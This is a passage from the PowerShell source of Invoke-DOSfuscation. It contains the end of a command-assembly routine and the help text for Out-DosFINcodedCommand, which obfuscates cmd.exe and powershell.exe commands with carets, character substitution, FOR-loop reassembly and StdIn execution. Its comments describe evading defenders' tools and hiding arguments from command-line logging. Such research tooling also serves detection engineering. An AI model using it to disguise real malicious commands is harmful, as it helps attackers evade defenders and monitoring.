            $c2 = Out-ObfuscatedCaret -StringToObfuscate $c2 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($VFlag -notmatch '\%.*\:.*\%')
        {
            $VFlag = Out-ObfuscatedCaret -StringToObfuscate $VFlag -RandomCaretPercent:$RandomCaretPercent
        }

        $commandVarNameSet     = Out-ObfuscatedCaret -StringToObfuscate $commandVarNameSet     -RandomCaretPercent:$RandomCaretPercent
        $commandVarNameGet     = Out-ObfuscatedCaret -StringToObfuscate $commandVarNameGet     -RandomCaretPercent:$RandomCaretPercent
        $forLoopCommandVarName = Out-ObfuscatedCaret -StringToObfuscate $forLoopCommandVarName -RandomCaretPercent:$RandomCaretPercent
        $forLoopIndexVarName   = Out-ObfuscatedCaret -StringToObfuscate $forLoopIndexVarName   -RandomCaretPercent:$RandomCaretPercent
        $finalSubstringIndex   = Out-ObfuscatedCaret -StringToObfuscate $finalSubstringIndex   -RandomCaretPercent:$RandomCaretPercent
    }

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpaceA = ''
    $randomSpace1 = ''
    $randomSpace2 = ''
    $randomSpace3 = ''
    $randomSpace4 = ''
    $randomSpace5 = ''
    $randomSpace6 = ''
    $randomSpace7 = ''
    if ($RandomSpace.IsPresent)
    {
        $RandomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace3 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace4 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace5 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace6 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace7 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Get random commas and/or semicolons (and whitespace mixed in if -RandomSpace is also selected).'
    $randomCharA  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomCharB  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar1  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar2  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar3  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar4  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar5  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar6  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar7  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar8  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar9  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar10 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar11 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar12 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar13 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar14 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray

    # Randomly select a comparison operation syntax to perform against bookend index value.
    # These options are '==' (string comparison of integers) or EQU (==), GEQ (>=) and GTR (>) for integer comparisons compatible with cmd.exe's IF command (https://ss64.com/nt/if.html).
    $spaceForRandomCharB = ''
    if ($randomCharB.Length -eq 0)
    {
        $spaceForRandomCharB = ' '
    }
    $doubleEqual = '=='
    $commandIndexBookendMinus1 = ($commandIndexBookend - 1)
    
    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $doubleEqual               = Out-ObfuscatedCaret -StringToObfuscate $doubleEqual               -RandomCaretPercent:$RandomCaretPercent
        $commandIndexBookend       = Out-ObfuscatedCaret -StringToObfuscate $commandIndexBookend       -RandomCaretPercent:$RandomCaretPercent
        $commandIndexBookendMinus1 = Out-ObfuscatedCaret -StringToObfuscate $commandIndexBookendMinus1 -RandomCaretPercent:$RandomCaretPercent
    
        # '==' cannot start with a caret, so trim.
        $doubleEqual = $doubleEqual.TrimStart('^')
    }

    # Randomly add explicit '+' or '-' sign to positive index value option if -RandomChar is selected.
    $randomPlusOrMinusSign1  = ''
    $randomPlusOrMinusSign2  = ''
    if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
    {
        if ($commandIndexBookend -eq 0)
        {
            $randomPlusOrMinusSign1 = Get-Random -InputObject @('-','+')
        }
        elseif ($commandIndexBookend -gt 0)
        {
            $randomPlusOrMinusSign1 = '+'
        }
    
        if ($commandIndexBookendMinus1 -eq 0)
        {
            $randomPlusOrMinusSign2 = Get-Random -InputObject @('-','+')
        }
        elseif ($commandIndexBookendMinus1 -gt 0)
        {
            $randomPlusOrMinusSign2 = '+'
        }
    }
    
    # Set bookend comparison syntax.
    $bookendComparison = $randomCharA + (Get-Random -InputObject ("$doubleEqual$randomCharB$commandIndexBookend","$spaceForRandomCharB$equ$spaceForRandomCharB$randomCharB$randomPlusOrMinusSign1$commandIndexBookend","$spaceForRandomCharB$geq$spaceForRandomCharB$randomCharB$randomPlusOrMinusSign1$commandIndexBookend","$spaceForRandomCharB$gtr$spaceForRandomCharB$randomCharB$randomPlusOrMinusSign2$commandIndexBookendMinus1"))

    # Ensure that bookend starts with a whitespace if value starts with the integer comparisons EQU (==), GEQ (>=) or GTR (>). Take into account potential obfuscation characters as they do not count as whitespace for this check.
    if (@('e','g') -contains ($bookendComparison -replace '[^\w\s]','')[0])
    {
        $bookendComparison = ' ' + $bookendComparison
    }

    # If -RandomChar argument is selected then add random parenthese layers where applicable based on $RandomCharRange.
    if ($RandomChar.IsPresent)
    {
        # Retrieve parenthesis counts from $randomCharRange so we get a balanced number of left and right parentheses from Get-RandomWhitespaceAndRandomChar.
        $parenCount1 = Get-Random -InputObject $randomCharRange -Count 1
        $parenCount2 = Get-Random -InputObject $randomCharRange -Count 1

        # Get random left and right parentheses with random whitespace if -RandomWhitespace argument is selected and with random commas and/or semicolons delimiters if -RandomChar argument is selected.
        $leftParen1  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen1 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $leftParen2  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen2 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
    
        # Trim leading delimiters and whitespace from parentheses since they will cause errors for variable SET commands inside FOR loops and PowerShell payloads.
        $leftParen1  = $leftParen1.Trim(' ,;')
        $rightParen1 = $rightParen1.Trim(' ,;')
        $leftParen2  = $leftParen2.Trim(' ,;')
        $rightParen2 = $rightParen2.Trim(' ,;')
    }
    else
    {
        $leftParen1  = ''
        $rightParen1 = ''
        $leftParen2  = ''
        $rightParen2 = ''
    }

    # If -RandomChar argument is selected then handle random commas/semicolons later in this function but ensure that the cmd.exe path ends with a comma/semicolon.
    # This is to highlight an obfuscation technique that many defenders' tools do not handle when attempting to look up a file, namely many assume the extension is ".exe," and fail to find the file on disk.
    if ($RandomChar.IsPresent)
    {
        $CmdSyntax  = $CmdSyntax.TrimEnd()  + (Get-Random -InputObject $RandomCharArray)
        $Cmd2Syntax = $Cmd2Syntax.TrimEnd() + (Get-Random -InputObject $RandomCharArray)
    }

    # If $CmdSyntax involves a path then whitespace is required after $CmdSyntax.
    if (($CmdSyntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $CmdSyntax.EndsWith(' '))
    {
        $CmdSyntax += ' '
    }

    # If $Cmd2Syntax involves a path then whitespace is required after $Cmd2Syntax.
    if (($Cmd2Syntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $Cmd2Syntax.EndsWith(' '))
    {
        $Cmd2Syntax += ' '
    }

    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmdSyntax)
    {
        # No additional escaping is needed for $CmdSyntax since it is the very beginning of the command. Later intricate syntaxes ($Cmd2Syntax and $PowerShellSyntax) will need additional escaping.
        
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        # Since this is the beginning of the whole command ensure that this single-alphanumeric variable is not accidentally present (particular NOT as a variable) in the remaining command.
        do
        {
            $cmdSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        }
        while (([System.String] $setCommandArray).ToLower().Contains("%$cmdSyntaxVarName".ToLower()))

        if ($RandomCaret.IsPresent)
        {
            $cmdSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmdSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($CmdSyntax -match $intricateForLoopRegex1)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmdSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($CmdSyntax -match $intricateForLoopRegex2)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmdSyntaxVarName)
        }
    }

    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmd2Syntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $cmd2SyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $cmd2SyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmd2SyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($Cmd2Syntax -match $intricateForLoopRegex1)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmd2SyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($Cmd2Syntax -match $intricateForLoopRegex2)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmd2SyntaxVarName)
        }

        # Perform additional escaping for string tokens in the intricate syntax.
        $Cmd2SyntaxExtraCarets = $Cmd2Syntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($Cmd2Syntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $Cmd2SyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $Cmd2Syntax = $Cmd2Syntax.Replace($stringToEscape.Content,$escapedString)
                $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }

    # If using one of the more intricate PowerShell syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricatePowerShellSyntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $powershellSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $powershellSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $powershellSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($PowerShellSyntax -match $intricateForLoopRegex1)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $powershellSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($PowerShellSyntax -match $intricateForLoopRegex2)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $powershellSyntaxVarName)
        }

        # Perform additional escaping for string tokens in the intricate syntax.
        $powerShellSyntaxExtraCarets = $PowerShellSyntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($PowerShellSyntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $powerShellSyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $PowerShellSyntax = $PowerShellSyntax.Replace($stringToEscape.Content,$escapedString)
                $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }

    # Ensure proper spacing after $CmdSyntax in $DecoyString1.
    if (-not ($randomChar1 -or $CmdSyntax.EndsWith(' ')) -and -not $DecoyString1.StartsWith(' '))
    {
        $DecoyString1 = ' ' + $DecoyString1
    }

    # Ensure specific $randomChar* variables are at least one whitespace if they are not defined.
    if (-not $randomChar5 ) { $randomChar5  = ' ' }
    if (-not $randomChar6 ) { $randomChar6  = ' ' }
    if (-not $randomChar7 ) { $randomChar7  = ' ' }
    if (-not $randomChar10) { $randomChar10 = ' ' }
    if (-not $randomChar11) { $randomChar11 = ' ' }
    if (-not $randomChar12) { $randomChar12 = ' ' }

    # Handle final syntax for -FinalBinary options of 'none' (default), 'powershell' and 'cmd' along with the optional -StdIn switch.
    if ($FinalBinary -eq 'none')
    {
        $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5%$forLoopIndexVarName$randomChar6$in$randomChar7($commandIndexes)$randomChar8$do $leftParen1$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar9$if$randomChar10%$forLoopIndexVarName$bookendComparison$randomChar11$leftParen2$call$randomChar12%$forLoopCommandVarName`:$finalSubstringIndex%$rightParen2$randomSpace6`""
    }
    elseif ($FinalBinary -eq 'powershell')
    {
        # Use PowerShell syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
        if ($intricatePowerShellSyntax)
        {
            $PowerShellSyntax = $powerShellSyntaxExtraCarets
        }

        # If the input PowerShell command contains a semicolon then if it is delimiting numerous commands we cannot encapsulate the PowerShell command with parentheses.
        if ($Command.Contains(';'))
        {
            $leftParen2  = ''
            $rightParen2 = ''
        }
        else
        {
            # If parentheses remain to encapsulate the input PowerShell command then we need to remove any obfuscation delimiters (, and/or ;) from the obfuscated parentheses.
            $leftParen2  = $leftParen2  -replace '[,;]',''
            $rightParen2 = $rightParen2 -replace '[,;]',''
        }

        if ($StdIn.IsPresent)
        {
            # An additional layer of escaping for already-escaped '=' signs is required.
            if ($intricatePowerShellSyntax)
            {
                if ($PowerShellSyntax -match '[^\^](\^{6})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^^^=','^^^^^^^=')
                }
                elseif ($PowerShellSyntax -match '[^\^](\^{2})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^=','^^^=')
                }
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5%$forLoopIndexVarName$randomChar6$in$randomChar7($commandIndexes)$randomChar8$do $leftParen1$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar9$if$randomChar10%$forLoopIndexVarName$bookendComparison$randomChar11$echo$($randomChar12.Replace(',',';'))$leftParen2!$forLoopCommandVarName`:$finalSubstringIndex!$rightParen2$($randomChar13.Replace(',',';'))|$randomChar14$PowerShellSyntax $randomSpace6-$randomSpace7`""
        }
        else
        {
            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5%$forLoopIndexVarName$randomChar6$in$randomChar7($commandIndexes)$randomChar8$do $leftParen1$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar9$if$randomChar10%$forLoopIndexVarName$bookendComparison$randomChar11$PowerShellSyntax$($randomChar12.Replace(',',';'))`"$($randomChar13.Replace(',',';'))$leftParen2!$forLoopCommandVarName`:$finalSubstringIndex!$rightParen2`"$($randomChar14.Replace(',',';'))`""
        }
    }
    else
    {
        # Use Cmd2 syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
        if ($intricateCmd2Syntax)
        {
            $Cmd2Syntax = $cmd2SyntaxExtraCarets
        }

        if ($StdIn.IsPresent)
        {
            # An additional layer of escaping for already-escaped '=' signs is required.
            if ($intricateCmd2Syntax)
            {
                $Cmd2Syntax = $Cmd2Syntax.Replace('^^=','^^^=')
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5%$forLoopIndexVarName$randomChar6$in$randomChar7($commandIndexes)$randomChar8$do $leftParen1$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar9$if$randomChar10%$forLoopIndexVarName$bookendComparison$randomChar11$echo$randomChar12$leftParen2!$forLoopCommandVarName`:$finalSubstringIndex!$rightParen2$randomSpace6|$randomChar13$Cmd2Syntax$randomChar14`""
        }
        else
        {
            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5%$forLoopIndexVarName$randomChar6$in$randomChar7($commandIndexes)$randomChar8$do $leftParen1$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar9$if$randomChar10%$forLoopIndexVarName$bookendComparison$randomChar11$Cmd2Syntax$randomChar12/$c2$randomChar13$leftParen2!$forLoopCommandVarName`:$finalSubstringIndex!$rightParen2$randomSpace6`""
        }
    }

    # Throw warning if command size exceeds cmd.exe's 8,190 character limit.
    $cmdMaxLength = 8190
    if ($finalCommand.Length -gt $cmdMaxLength)
    {
        Write-Warning "This command exceeds the cmd.exe maximum allowed length of $cmdMaxLength characters! Its length is $($finalCommand.Length) characters."
        Start-Sleep -Seconds 1
    }

    # Return final command.
    return $finalCommand
}


function Out-DosFINcodedCommand
{
<#
.SYNOPSIS

Out-DosFINcodedCommand obfuscates input cmd.exe and powershell.exe commands via numerous methods supported by cmd.exe including:
    1) numerous layers of escaping
    2) cmd.exe's character/string substitution capabilities for environment variables
    3) optional randomized casing
    4) optional randomized variable names
    5) optional whitespace obfuscation
    6) optional caret obfuscation
    7) optional comma, semicolon and parentheses obfuscation
    8) optional intricate syntax for cmd.exe and powershell.exe
    9) cmd.exe's and powershell.exe's ability to execute commands via Standard Input

Invoke-DOSfuscation Function: Out-DosFINcodedCommand
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Get-RandomVarName, Out-SetVarCommand, Split-Command, Test-ContainsEscapableCharacter, Out-EscapedPowerShell, Test-ContainsUnevenDoubleQuote, Remove-Tab, Out-ObfuscatedArray, Out-ObfuscatedCaret (all located in Invoke-DOSfuscation.psm1)
Optional Dependencies: None
 
.DESCRIPTION

Out-DosFINcodedCommand obfuscates input cmd.exe and powershell.exe commands via cmd.exe's character/string substitution capabilities for environment variables.

.PARAMETER Command

Specifies the command to obfuscate with string indexing and in-memory command reassembly via cmd.exe's FOR loop syntax. This input command can also be obfuscated like: net""stat -""ano | find "127.0.0.1"

.PARAMETER FinalBinary

(Optional) Specifies the obfuscated command should be executed by a child process of powershell.exe, cmd.exe or no unnecessary child process (default). Some command escaping scenarios require at least one child process to avoid errors and will automatically be converted to such necessary syntax.

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters adjusted for -Command length. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER CmdSyntax

(Optional) Specifies the syntax to reference the initial cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER Cmd2Syntax

(Optional) Specifies the syntax to reference the final cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER PowerShellSyntax

(Optional) Specifies the syntax to reference powershell.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER StdIn

(Optional) Specifies that the final command be executed by ECHO'ing it into cmd.exe (or powershell.exe if -PowerShell is specified) to be executed via StdIn. This prevents the arguments from appearing in the final binary's command line arguments.

.PARAMETER DecoyString1

(Optional) Specifies the decoy string to set after the initial cmd.exe and before the /V or /C flags.

.PARAMETER DecoyString2

(Optional) Specifies the decoy string to set after the initial /V flag and before the /C flag.

.PARAMETER VFlag

(Optional) Specifies the decoy string (starting with "V") for the /V:ON flag as long as it is not /V:OFF.

.PARAMETER SubstitutionPercent

(Optional) Specifies the percentage of input Command to substitute with cmd.exe's character replacement functionality.

.PARAMETER RandomPlaceholderCharArray

(Optional) Specifies the array of characters to serve as placeholders in original command for each substituted character.

.PARAMETER RandomCase

(Optional) Specifies that random casing be used wherever possible.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomFlag

(Optional) Specifies that random flag values be selected wherever possible (e.g. /C and /R interchangeability, environment variable encoding for /C and /V, etc.).

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of eligible characters to insert commas, semicolons and parentheses into if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER VarNameSpecialChar

(Optional) Specifies that variable names to be comprised entirely of special characters.

.PARAMETER VarNameWhitespace

(Optional) Specifies that variable names to be comprised entirely of whitespace characters following a mandatory initial non-VarNameWhitespace character (randomly-selected special character).

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosFINcodedCommand

cmd /V:ON/C"set 0QO=0ew3waw -a0o&&set 4i=!0QO:3=s!&&set Ypi6=!4i:w=t!&&set qu=!Ypi6:0=n!&&call %qu%"

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosFINcodedCommand -ObfuscationLevel 3

^f^O^R    ;  ,    ,    ,    /^F  ;  ;    ,  "      tokens=    +1        delims=.=Jw"  ;    ;   ;    ,   ;   %^I   ;    ;    ;   ,  In   ,    ;  ;   ,    ;    (   ,  ,    ;   '    ,    ,   ;  ,    ^^A^^S^^s^^O^^C  ;    ,    ;    ;    ^|    ,   ;  ,  ^^f^^in^^d^^S^^T^^r   ;  ;    ,    ;  ^^m^^d^=       '  ;   ;    ,    ,   )  ;   ,   ;    ^d^O    ,    ;   ;  %^I;     ;    ,  ;    X^/V^A)^O^M^O^U(T     ^  ^-^Ran^d^om^Ca^retP^e^r^cen^t^:^87    ;  ;   ,  ,  nc16iUC7yw/^C       "   ,   ,  ,   ,  (        ;     ;    ;      (   (   ;   ;   ;        (^s^e^T^ ^  ^ ^~^ ^ ^ ^=^]^ ^[^@^[^a^[^;^{^a^]^#)       ,     ,   ,       )   ,      ,    ,        ,    ,      )   ,        ;    ,      ;       ,    ;        ,      ;       ,    ;    ,       )&      (     ,       ,        ,    ,     ,    (     ,       (^s^E^t ^ ^ ^ ^ ^ ^ ^ ^ ^*^  ^ ^ =^!^~^  ^ ^:^ =^e^!) ; ; ; ; ) , , )&&        (    ;       ;    ;   ;       ;      (    ;      ;   ;     ;     ;      (        ;   ;      ;      (   ,   ,       (^S^E^T ^  ^ ^`^ ^ =^!^*^ ^ ^ ^ :^;^=^ ^!)     ;       ;      ;    )   ,      )        ,       ,   )     ,        ,       )&&    ( , , ( ; ; ; ; ( ; ; ; ; (^s^e^t ^ ^ ^ ^ ^ ^ ^ ^ ^? ^ ^ ^ =^!^`^ ^ ^:^]^=n^!)       ;   ;       ;     )      ,   ,       )     ,   ,   )&    (       ,   ;     ,        ;    ,        ;       ,      ;   ,        ;    ,       (       ,    ;      ,   ;        ,      ;        ,     ;    ,        ;       ,       (       ,     ,      ,   ,        ,      (^S^e^t ^ ^ ^ ^ ^*^ ^ ^ ^ ^ =^!^?^ ^ ^ ^ ^:^[^=^t^!)      ,    ,      )        ,     ,     )        ;   ;        ; 